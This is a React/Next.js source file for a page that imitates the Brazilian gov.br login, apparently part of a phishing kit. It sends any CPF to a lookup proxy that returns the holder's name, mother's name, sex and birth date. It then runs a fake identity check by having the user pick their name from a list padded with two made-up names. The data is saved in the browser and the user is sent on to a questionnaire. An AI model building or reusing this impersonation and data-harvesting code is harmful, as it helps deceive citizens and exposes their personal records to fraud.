'use client';

import { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import Link from 'next/link';
import { useAuth } from '@/contexts/AuthContext';

interface UserData {
  cpf: string;
  nome: string;
  mae: string;
  sexo: string;
  nascimento: string;
}

// Lista de nomes brasileiros para gerar opções falsas
const NOMES_FALSOS = [
  'MARIA SILVA SANTOS', 'JOSE OLIVEIRA COSTA', 'ANA PAULA FERREIRA',
  'CARLOS EDUARDO LIMA', 'JULIANA ALVES RODRIGUES', 'MARCOS ANTONIO SOUZA',
  'PATRICIA RIBEIRO ALMEIDA', 'FERNANDO GOMES PEREIRA', 'CAMILA MARTINS BARBOSA',
  'RODRIGO CARVALHO NASCIMENTO', 'LUCIANA MENDES ARAUJO', 'RAFAEL TEIXEIRA DIAS',
  'ADRIANA LOPES CARDOSO', 'BRUNO HENRIQUE MOREIRA', 'VANESSA SANTOS CORREIA',
  'LEONARDO PINTO VIEIRA', 'DANIELA CASTRO ROCHA', 'GUSTAVO RAMOS MONTEIRO',
  'TATIANA FREITAS MACHADO', 'DIEGO AZEVEDO CUNHA', 'RENATA DUARTE CAMPOS',
  'THIAGO NUNES CAVALCANTI', 'AMANDA REIS MEDEIROS', 'FELIPE MIRANDA ANDRADE',
  'FERNANDA BATISTA MOURA', 'RICARDO SALES NOGUEIRA', 'PRISCILA FARIAS BEZERRA',
  'ANDERSON VIEIRA MELO', 'SIMONE BARROS AGUIAR', 'MARCELO CRUZ PINHEIRO'
];

export default function LoginPage() {
  const router = useRouter();
  const { login } = useAuth();
  const [step, setStep] = useState<'cpf' | 'nome'>('cpf');
  const [cpf, setCpf] = useState('');
  const [userData, setUserData] = useState<UserData | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [opcoesNome, setOpcoesNome] = useState<string[]>([]);
  const [nomeSelecionado, setNomeSelecionado] = useState<string | null>(null);

  // Gerar opções de nome (1 correta + 2 falsas)
  const gerarOpcoesNome = (nomeCorreto: string): string[] => {
    const nomeUpper = nomeCorreto.toUpperCase();
    const nomesFiltrados = NOMES_FALSOS.filter(n => n !== nomeUpper);
    const shuffled = nomesFiltrados.sort(() => Math.random() - 0.5);
    const falsos = shuffled.slice(0, 2);
    const opcoes = [nomeUpper, ...falsos].sort(() => Math.random() - 0.5);
    return opcoes;
  };

  // Limpar CPF (remover pontos e traços)
  const limparCPF = (cpfValue: string): string => {
    return cpfValue.replace(/\D/g, '');
  };

  // Formatar CPF com máscara
  const formatarCPF = (valor: string): string => {
    const numeros = valor.replace(/\D/g, '');
    
    if (numeros.length > 11) {
      return formatarCPF(numeros.substring(0, 11));
    }
    
    if (numeros.length > 9) {
      return numeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    } else if (numeros.length > 6) {
      return numeros.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
    } else if (numeros.length > 3) {
      return numeros.replace(/(\d{3})(\d{3})/, '$1.$2');
    }
    
    return numeros;
  };

  // Handler de mudança no input
  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const valorFormatado = formatarCPF(e.target.value);
    setCpf(valorFormatado);
    // Limpar erro ao digitar
    if (errorMessage) {
      setErrorMessage('');
    }
  };

  // Buscar dados do usuário via proxy (com User-Agent Python)
  const buscarDadosUsuario = async (cpfValue: string) => {
    const cpfLimpo = limparCPF(cpfValue);
    const url = `/api/cpf/${cpfLimpo}`;
    
    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error('Erro ao buscar dados do usuário');
      }
      const dados = await response.json();
      return dados;
    } catch (error) {
      console.error('Erro:', error);
      throw error;
    }
  };

  // Handler do submit - Etapa CPF
  const handleCpfSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    const cpfLimpo = limparCPF(cpf);
    
    if (cpfLimpo.length !== 11) {
      setErrorMessage('Por favor, digite um CPF válido');
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    try {
      const dadosUsuario = await buscarDadosUsuario(cpf);
      
      // Salvar dados básicos do usuário
      const dadosBasicos: UserData = {
        cpf: cpfLimpo,
        nome: dadosUsuario.nome || '',
        mae: dadosUsuario.nomeMae || '',
        sexo: dadosUsuario.sexo || '',
        nascimento: dadosUsuario.dataNascimento || ''
      };
      
      setUserData(dadosBasicos);
      
      // Salvar no localStorage
      localStorage.setItem('userBasicData', JSON.stringify(dadosBasicos));
      localStorage.setItem('cpfUsuario', cpfLimpo);
      
      console.log('Dados do usuário salvos:', dadosBasicos);
      
      // Gerar opções de nome e ir para etapa de validação
      const opcoes = gerarOpcoesNome(dadosBasicos.nome);
      setOpcoesNome(opcoes);
      setNomeSelecionado(null);
      setStep('nome');
      setIsLoading(false);
      
    } catch (error) {
      setErrorMessage('CPF inválido. Tente novamente.');
      setIsLoading(false);
    }
  };

  // Handler do submit - Etapa Nome
  const handleNomeSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!nomeSelecionado) {
      setErrorMessage('Por favor, selecione seu nome');
      return;
    }

    if (!userData) {
      setErrorMessage('Erro: dados do usuário não encontrados');
      return;
    }

    // Verificar se o nome selecionado é o correto
    if (nomeSelecionado.toUpperCase() !== userData.nome.toUpperCase()) {
      setErrorMessage('Nome incorreto. Tente novamente.');
      return;
    }

    setErrorMessage('');
    setIsLoading(true);

    try {
      // Simular validação
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Preparar dados para login
      const loginData = {
        nome: userData.nome,
        cpf: userData.cpf,
        dataNascimento: userData.nascimento,
        email: '',
        telefone: '',
      };
      
      // Fazer login usando o contexto
      login(loginData);
      
      // Salvar dados completos
      localStorage.setItem('usuarioLogado', JSON.stringify({
        ...loginData,
        mae: userData.mae,
        sexo: userData.sexo,
      }));
      
      // Redirecionar para o questionário
      router.push('/questionario');
      
    } catch (error) {
      alert('Erro ao realizar login.');
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      <header className="border-white-gray flex h-[60px] items-center border-b bg-white px-4 shadow-md">
        <div className="flex items-center">
          <Link href="/">
            <Image src="/govbr.svg" alt="gov.br" width={120} height={40} className="h-8 w-auto" />
          </Link>
        </div>
        <div className="ml-auto flex items-center space-x-4">
          <button className="text-blue hover:text-blue/80 text-sm">
            <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
            </svg>
          </button>
          <button className="text-blue hover:text-blue/80 text-sm">
            <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </button>
        </div>
      </header>

      <main className="flex justify-center px-4 pt-8">
        <div className="w-full max-w-sm">
          <div className="border-white-gray border bg-white px-[10px] py-[20px] shadow-md">
            {step === 'cpf' ? (
              <>
                <h1 className="text-gray-dark mb-6 text-[14px] font-bold">Identifique-se no gov.br com:</h1>
                
                <form className="space-y-4" onSubmit={handleCpfSubmit}>
                  <div>
                    <label className="text-blue mb-2 flex items-center text-sm font-medium">
                      <Image
                        src="/doc-icon.png"
                        alt="CPF"
                        width={32}
                        height={32}
                        className="mr-3 h-5 w-6"
                      />
                      Número do CPF
                    </label>
                    
                    <div className="space-y-4">
                      <p className="text-gray-dark text-xs">
                        Digite seu CPF para <span className="font-bold">criar</span> ou <span className="font-bold">acessar</span> sua conta gov.br
                      </p>
                      
                      <div className="relative">
                        <label htmlFor="cpf" className="text-gray-dark mb-1 block text-xs font-medium">
                          CPF
                        </label>
                        <input
                          id="cpf"
                          type="text"
                          placeholder="Digite seu CPF"
                          className={`text-gray-dark input-placeholder-custom w-full rounded border px-3 py-2 text-base font-medium transition-colors placeholder:text-gray-400 focus:outline-none focus:ring-1 ${
                            errorMessage 
                              ? 'border-red-500 focus:border-red-500 focus:ring-red-500' 
                              : 'border-gray-300 focus:border-black focus:ring-black'
                          }`}
                          maxLength={14}
                          value={cpf}
                          onChange={handleCpfChange}
                          style={{ fontSize: '16px' }}
                        />
                        {errorMessage && step === 'cpf' && (
                          <p className="mt-2 text-sm text-red-600">
                            {errorMessage}
                          </p>
                        )}
                      </div>
                    </div>
                  </div>
                  
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="bg-blue mt-4 flex h-[44px] w-full items-center justify-center rounded-full px-4 py-2.5 text-sm font-medium text-white shadow transition-opacity hover:opacity-90 disabled:opacity-50"
                  >
                    {isLoading ? (
                      <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                    ) : (
                      'Continuar'
                    )}
                  </button>
                </form>
              </>
            ) : (
              <>
                <h1 className="text-gray-dark mb-6 text-xl font-bold">Confirme sua identidade</h1>
                
                <form className="space-y-4" onSubmit={handleNomeSubmit}>
                  <div>
                    <label htmlFor="cpf-display" className="text-gray-dark mb-1 block text-xs font-medium">
                      CPF
                    </label>
                    <input
                      id="cpf-display"
                      type="text"
                      value={cpf}
                      disabled
                      className="text-gray-dark w-full rounded border px-3 py-2 text-base font-medium bg-gray-100 border-gray-300"
                      style={{ fontSize: '16px' }}
                    />
                  </div>

                  <div>
                    <label className="text-gray-dark mb-3 block text-xs font-medium">
                      Selecione seu nome completo:
                    </label>
                    <div className="space-y-2">
                      {opcoesNome.map((nome: string, index: number) => (
                        <button
                          key={index}
                          type="button"
                          onClick={() => {
                            setNomeSelecionado(nome);
                            if (errorMessage) setErrorMessage('');
                          }}
                          className={`w-full rounded border px-4 py-3 text-left text-sm font-medium transition-colors ${
                            nomeSelecionado === nome
                              ? 'border-blue bg-blue/5 text-blue'
                              : 'border-gray-300 text-gray-dark hover:border-gray-400 hover:bg-gray-50'
                          }`}
                        >
                          {nome}
                        </button>
                      ))}
                    </div>
                    {errorMessage && step === 'nome' && (
                      <p className="mt-2 text-sm text-red-600">
                        {errorMessage}
                      </p>
                    )}
                  </div>

                  <div className="flex gap-3">
                    <button
                      type="button"
                      onClick={() => {
                        setStep('cpf');
                        setNomeSelecionado(null);
                        setErrorMessage('');
                      }}
                      className="flex h-[44px] flex-1 items-center justify-center rounded-full border-2 border-blue px-4 py-2.5 text-sm font-medium text-blue transition-colors hover:bg-blue-50"
                    >
                      Voltar
                    </button>
                    <button
                      type="submit"
                      disabled={isLoading || !nomeSelecionado}
                      className="bg-blue flex h-[44px] flex-1 items-center justify-center rounded-full px-4 py-2.5 text-sm font-medium text-white shadow transition-opacity hover:opacity-90 disabled:opacity-50"
                    >
                      {isLoading ? (
                        <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                      ) : (
                        'Confirmar'
                      )}
                    </button>
                  </div>
                </form>
              </>
            )}

            <div className="mt-16 space-y-6 text-center font-medium">
              <div className="text-blue flex items-center justify-center text-xs">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" className="mr-4 h-3 w-3">
                  <path
                    fill="#1351B4"
                    d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM169.8 165.3c7.9-22.3 29.1-37.3 52.8-37.3h58.3c34.9 0 63.1 28.3 63.1 63.1c0 22.6-12.1 43.5-31.7 54.8L280 264.4c-.2 13-10.9 23.6-24 23.6c-13.3 0-24-10.7-24-24V250.5c0-8.6 4.6-16.5 12.1-20.8l44.3-25.4c4.7-2.7 7.6-7.7 7.6-13.1c0-8.4-6.8-15.1-15.1-15.1H222.6c-3.4 0-6.4 2.1-7.5 5.3l-.4 1.2c-4.4 12.5-18.2 19-30.6 14.6s-19-18.2-14.6-30.6l.4-1.2zM224 352a32 32 0 1 1 64 0 32 32 0 1 1 -64 0z"
                  />
                </svg>
                <a
                  href="https://www.gov.br/governodigital/pt-br/identidade/conta-gov-br/ajuda-da-conta-gov.br"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {step === 'cpf' ? 'Está com dúvidas e precisa de ajuda?' : 'Ficou com dúvidas?'}
                </a>
              </div>
              
              <div className="text-blue text-xs">
                <a href="https://cadastro.acesso.gov.br/termo-de-uso" target="_blank" rel="noopener noreferrer">
                  Termo de Uso e Aviso de Privacidade
                </a>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
